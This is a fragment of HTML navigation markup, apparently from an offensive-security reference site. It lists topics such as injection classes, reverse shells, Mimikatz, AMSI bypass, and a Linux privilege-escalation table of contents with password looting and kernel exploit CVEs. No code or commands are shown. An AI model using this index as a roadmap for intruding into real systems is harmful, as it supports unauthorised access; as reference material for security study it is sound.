        <label class="md-nav__link" for="__nav_21" id="__nav_21_label" tabindex="0">
          Insecure Management Interface
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_21_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_21">
          <span class="md-nav__icon md-icon"></span>
          Insecure Management Interface
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Management%20Interface/" class="md-nav__link">
        Insecure Management Interface
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_22" >
      
      
      
        <label class="md-nav__link" for="__nav_22" id="__nav_22_label" tabindex="0">
          Insecure Randomness
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_22_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_22">
          <span class="md-nav__icon md-icon"></span>
          Insecure Randomness
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Randomness/" class="md-nav__link">
        Insecure Randomness
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_23" >
      
      
      
        <label class="md-nav__link" for="__nav_23" id="__nav_23_label" tabindex="0">
          Insecure Source Code Management
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_23_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_23">
          <span class="md-nav__icon md-icon"></span>
          Insecure Source Code Management
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Source%20Code%20Management/" class="md-nav__link">
        Insecure Source Code Management
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_24" >
      
      
      
        <label class="md-nav__link" for="__nav_24" id="__nav_24_label" tabindex="0">
          JSON Web Token
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_24_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_24">
          <span class="md-nav__icon md-icon"></span>
          JSON Web Token
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../JSON%20Web%20Token/" class="md-nav__link">
        JWT - JSON Web Token
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_25" >
      
      
      
        <label class="md-nav__link" for="__nav_25" id="__nav_25_label" tabindex="0">
          Java RMI
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_25_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_25">
          <span class="md-nav__icon md-icon"></span>
          Java RMI
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Java%20RMI/" class="md-nav__link">
        Java RMI
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26" >
      
      
      
        <label class="md-nav__link" for="__nav_26" id="__nav_26_label" tabindex="0">
          Kubernetes
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_26_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_26">
          <span class="md-nav__icon md-icon"></span>
          Kubernetes
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Kubernetes/" class="md-nav__link">
        Kubernetes
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_27" >
      
      
      
        <label class="md-nav__link" for="__nav_27" id="__nav_27_label" tabindex="0">
          LDAP Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_27_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_27">
          <span class="md-nav__icon md-icon"></span>
          LDAP Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../LDAP%20Injection/" class="md-nav__link">
        LDAP Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_28" >
      
      
      
        <label class="md-nav__link" for="__nav_28" id="__nav_28_label" tabindex="0">
          LaTeX Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_28_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_28">
          <span class="md-nav__icon md-icon"></span>
          LaTeX Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../LaTeX%20Injection/" class="md-nav__link">
        LaTex Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_29" checked>
      
      
      
        <label class="md-nav__link" for="__nav_29" id="__nav_29_label" tabindex="0">
          Methodology and Resources
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_29_label" aria-expanded="true">
        <label class="md-nav__title" for="__nav_29">
          <span class="md-nav__icon md-icon"></span>
          Methodology and Resources
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Active%20Directory%20Attack/" class="md-nav__link">
        Active Directory Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Bind%20Shell%20Cheatsheet/" class="md-nav__link">
        Bind Shell
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Cloud%20-%20AWS%20Pentest/" class="md-nav__link">
        Cloud - AWS
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Cloud%20-%20Azure%20Pentest/" class="md-nav__link">
        Cloud - Azure
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Cobalt%20Strike%20-%20Cheatsheet/" class="md-nav__link">
        Cobalt Strike
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Container%20-%20Docker%20Pentest/" class="md-nav__link">
        Container - Docker Pentest
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Container%20-%20Kubernetes%20Pentest/" class="md-nav__link">
        Container - Kubernetes Pentest
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Escape%20Breakout/" class="md-nav__link">
        Application Escape and Breakout
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Hash%20Cracking/" class="md-nav__link">
        Hash Cracking
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Linux%20-%20Evasion/" class="md-nav__link">
        Linux - Evasion
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Linux%20-%20Persistence/" class="md-nav__link">
        Linux - Persistence
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Linux - Privilege Escalation
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Linux - Privilege Escalation
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    Summary
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#checklists" class="md-nav__link">
    Checklists
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#looting-for-passwords" class="md-nav__link">
    Looting for passwords
  </a>
  
    <nav class="md-nav" aria-label="Looting for passwords">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#files-containing-passwords" class="md-nav__link">
    Files containing passwords
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#old-passwords-in-etcsecurityopasswd" class="md-nav__link">
    Old passwords in /etc/security/opasswd
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#last-edited-files" class="md-nav__link">
    Last edited files
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#in-memory-passwords" class="md-nav__link">
    In memory passwords
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#find-sensitive-files" class="md-nav__link">
    Find sensitive files
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ssh-key" class="md-nav__link">
    SSH Key
  </a>
  
    <nav class="md-nav" aria-label="SSH Key">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sensitive-files" class="md-nav__link">
    Sensitive files
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-key-predictable-prng-authorized_keys-process" class="md-nav__link">
    SSH Key Predictable PRNG (Authorized_Keys) Process
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scheduled-tasks" class="md-nav__link">
    Scheduled tasks
  </a>
  
    <nav class="md-nav" aria-label="Scheduled tasks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#cron-jobs" class="md-nav__link">
    Cron jobs
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#systemd-timers" class="md-nav__link">
    Systemd timers
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#suid" class="md-nav__link">
    SUID
  </a>
  
    <nav class="md-nav" aria-label="SUID">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-suid-binaries" class="md-nav__link">
    Find SUID binaries
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-a-suid-binary" class="md-nav__link">
    Create a SUID binary
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#capabilities" class="md-nav__link">
    Capabilities
  </a>
  
    <nav class="md-nav" aria-label="Capabilities">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#list-capabilities-of-binaries" class="md-nav__link">
    List capabilities of binaries
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#edit-capabilities" class="md-nav__link">
    Edit capabilities
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interesting-capabilities" class="md-nav__link">
    Interesting capabilities
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sudo" class="md-nav__link">
    SUDO
  </a>
  
    <nav class="md-nav" aria-label="SUDO">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nopasswd" class="md-nav__link">
    NOPASSWD
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ld_preload-and-nopasswd" class="md-nav__link">
    LD_PRELOAD and NOPASSWD
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#doas" class="md-nav__link">
    Doas
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sudo_inject" class="md-nav__link">
    sudo_inject
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cve-2019-14287" class="md-nav__link">
    CVE-2019-14287
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gtfobins" class="md-nav__link">
    GTFOBins
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wildcard" class="md-nav__link">
    Wildcard
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#writable-files" class="md-nav__link">
    Writable files
  </a>
  
    <nav class="md-nav" aria-label="Writable files">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#writable-etcsysconfignetwork-scripts-centosredhat" class="md-nav__link">
    Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#writable-etcpasswd" class="md-nav__link">
    Writable /etc/passwd
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#writable-etcsudoers" class="md-nav__link">
    Writable /etc/sudoers
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nfs-root-squashing" class="md-nav__link">
    NFS Root Squashing
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shared-library" class="md-nav__link">
    Shared Library
  </a>
  
    <nav class="md-nav" aria-label="Shared Library">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ldconfig" class="md-nav__link">
    ldconfig
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpath" class="md-nav__link">
    RPATH
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#groups" class="md-nav__link">
    Groups
  </a>
  
    <nav class="md-nav" aria-label="Groups">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#docker" class="md-nav__link">
    Docker
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#lxclxd" class="md-nav__link">
    LXC/LXD
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hijack-tmux-session" class="md-nav__link">
    Hijack TMUX session
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kernel-exploits" class="md-nav__link">
    Kernel Exploits
  </a>
  
    <nav class="md-nav" aria-label="Kernel Exploits">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#cve-2022-0847-dirtypipe" class="md-nav__link">
    CVE-2022-0847 (DirtyPipe)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cve-2016-5195-dirtycow" class="md-nav__link">
    CVE-2016-5195 (DirtyCow)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cve-2010-3904-rds" class="md-nav__link">
    CVE-2010-3904 (RDS)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cve-2010-4258-full-nelson" class="md-nav__link">
    CVE-2010-4258 (Full Nelson)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cve-2012-0056-mempodipper" class="md-nav__link">
    CVE-2012-0056 (Mempodipper)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../MSSQL%20Server%20-%20Cheatsheet/" class="md-nav__link">
        MSSQL Server
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Metasploit%20-%20Cheatsheet/" class="md-nav__link">
        Metasploit
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Methodology%20and%20enumeration/" class="md-nav__link">
        Bug Hunting Methodology and Enumeration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Miscellaneous%20-%20Tricks/" class="md-nav__link">
        Miscellaneous & Tricks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Network%20Discovery/" class="md-nav__link">
        Network Discovery
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Network%20Pivoting%20Techniques/" class="md-nav__link">
        Network Pivoting Techniques
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Office%20-%20Attacks/" class="md-nav__link">
        Office - Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Powershell%20-%20Cheatsheet/" class="md-nav__link">
        Powershell
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Reverse%20Shell%20Cheatsheet/" class="md-nav__link">
        Reverse Shell Cheat Sheet
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Source%20Code%20Management/" class="md-nav__link">
        Source Code Management
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Subdomains%20Enumeration/" class="md-nav__link">
        Subdomains Enumeration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20AMSI%20Bypass/" class="md-nav__link">
        AMSI Bypass
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20DPAPI/" class="md-nav__link">
        Windows - DPAPI
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Defenses/" class="md-nav__link">
        Windows - Defenses
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Download%20and%20Execute/" class="md-nav__link">
        Windows - Download and execute methods
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Mimikatz/" class="md-nav__link">
        Windows - Mimikatz
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Persistence/" class="md-nav__link">
        Windows - Persistence
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Privilege%20Escalation/" class="md-nav__link">
        Windows - Privilege Escalation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Using%20credentials/" class="md-nav__link">
        Windows - Using credentials
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_30" >
      
      
      
        <label class="md-nav__link" for="__nav_30" id="__nav_30_label" tabindex="0">
          NoSQL Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_30_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_30">
          <span class="md-nav__icon md-icon"></span>
          NoSQL Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../NoSQL%20Injection/" class="md-nav__link">
        NoSQL Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_31" >
      
      
      
        <label class="md-nav__link" for="__nav_31" id="__nav_31_label" tabindex="0">
          OAuth Misconfiguration
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_31_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_31">
          <span class="md-nav__icon md-icon"></span>
          OAuth Misconfiguration
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../OAuth%20Misconfiguration/" class="md-nav__link">
        OAuth Misconfiguration
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_32" >
      
      
      
        <label class="md-nav__link" for="__nav_32" id="__nav_32_label" tabindex="0">
          Open Redirect
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_32_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_32">
          <span class="md-nav__icon md-icon"></span>
          Open Redirect
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Open%20Redirect/" class="md-nav__link">
        Open URL Redirection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_33" >
      
      
      
        <label class="md-nav__link" for="__nav_33" id="__nav_33_label" tabindex="0">
          Race Condition
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_33_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_33">
          <span class="md-nav__icon md-icon"></span>
          Race Condition
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Race%20Condition/" class="md-nav__link">
        Race Condition
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_34" >
      
      
      
        <label class="md-nav__link" for="__nav_34" id="__nav_34_label" tabindex="0">
          Request Smuggling
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_34_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_34">
          <span class="md-nav__icon md-icon"></span>
          Request Smuggling
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Request%20Smuggling/" class="md-nav__link">
        Request Smuggling
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_35" >
      
      
      
        <label class="md-nav__link" for="__nav_35" id="__nav_35_label" tabindex="0">
          SAML Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_35_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_35">
          <span class="md-nav__icon md-icon"></span>
          SAML Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SAML%20Injection/" class="md-nav__link">
        SAML Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_36" >
      
      
      
        <label class="md-nav__link" for="__nav_36" id="__nav_36_label" tabindex="0">
          SQL Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_36_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_36">
          <span class="md-nav__icon md-icon"></span>
          SQL Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/" class="md-nav__link">
        SQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/BigQuery%20Injection/" class="md-nav__link">
        Google BigQuery SQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/Cassandra%20Injection/" class="md-nav__link">
        Cassandra Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/DB2%20Injection/" class="md-nav__link">
        DB2 Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/HQL%20Injection/" class="md-nav__link">
        Hibernate Query Language Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/MSSQL%20Injection/" class="md-nav__link">
        MSSQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/MySQL%20Injection/" class="md-nav__link">
        MYSQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/OracleSQL%20Injection/" class="md-nav__link">
        Oracle SQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/PostgreSQL%20Injection/" class="md-nav__link">
        PostgreSQL injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/SQLite%20Injection/" class="md-nav__link">
        SQLite Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_37" >
      
      
      
        <label class="md-nav__link" for="__nav_37" id="__nav_37_label" tabindex="0">
          Server Side Request Forgery
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_37_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_37">
          <span class="md-nav__icon md-icon"></span>
          Server Side Request Forgery
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Server%20Side%20Request%20Forgery/" class="md-nav__link">
        Server-Side Request Forgery
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_38" >
      
      
      
        <label class="md-nav__link" for="__nav_38" id="__nav_38_label" tabindex="0">
          Server Side Template Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_38_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_38">
          <span class="md-nav__icon md-icon"></span>
          Server Side Template Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Server%20Side%20Template%20Injection/" class="md-nav__link">
        Server Side Template Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_39" >
      
      
      
        <label class="md-nav__link" for="__nav_39" id="__nav_39_label" tabindex="0">
          Tabnabbing
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_39_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_39">
          <span class="md-nav__icon md-icon"></span>
          Tabnabbing
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tabnabbing/" class="md-nav__link">
        Tabnabbing
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_40" >
      
      
      
        <label class="md-nav__link" for="__nav_40" id="__nav_40_label" tabindex="0">
          Type Juggling
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_40_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_40">
          <span class="md-nav__icon md-icon"></span>
          Type Juggling
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Type%20Juggling/" class="md-nav__link">
        PHP Juggling type and magic hashes
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41" >
      
      
      
        <label class="md-nav__link" for="__nav_41" id="__nav_41_label" tabindex="0">
          Upload Insecure Files
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_41_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41">
